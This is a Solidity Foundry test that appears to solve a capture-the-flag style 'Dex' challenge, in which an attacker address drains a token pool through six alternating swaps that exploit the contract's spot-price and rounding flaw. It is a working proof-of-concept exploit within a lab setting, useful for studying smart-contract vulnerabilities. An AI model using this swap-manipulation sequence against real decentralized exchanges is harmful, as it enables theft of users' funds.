// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    Dex public dex;
    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");

    SwappableToken public token1;
    SwappableToken public token2;

    function setUp() public {
        vm.startPrank(owner);
        dex = new Dex(owner);

        token1 = new SwappableToken(owner, "Token1", "TK1", 110);
        token2 = new SwappableToken(owner, "Token2", "TK2", 110);

        // Set tokens in the Dex contract
        dex.setTokens(address(token1), address(token2));
        console.log("Owner Token1 Balance before transfer:", token1.balanceOf(owner));

        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);
        console.log("Owner Token1 Balance After transfer:", token1.balanceOf(owner));
        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);

        vm.stopPrank();
    }

    function test_multiple_swaps() public {
        vm.startPrank(attacker);
        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        uint256 token1Expected = token1.balanceOf(address(dex));
        uint256 token2Expected = token2.balanceOf(address(dex));
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);
        dex.swap(address(token2), address(token1), 45);

        uint256 token1Balance = token1.balanceOf(attacker);
        uint256 token2Balance = token2.balanceOf(attacker);
        uint256 token2ExpectedAfter = token2.balanceOf(address(dex));
        uint256 token1ExpectedAfter = token1.balanceOf(address(dex));

        assert(token1Balance == token1Expected + 10);
        assertEq(token1ExpectedAfter, 0);
    }
}
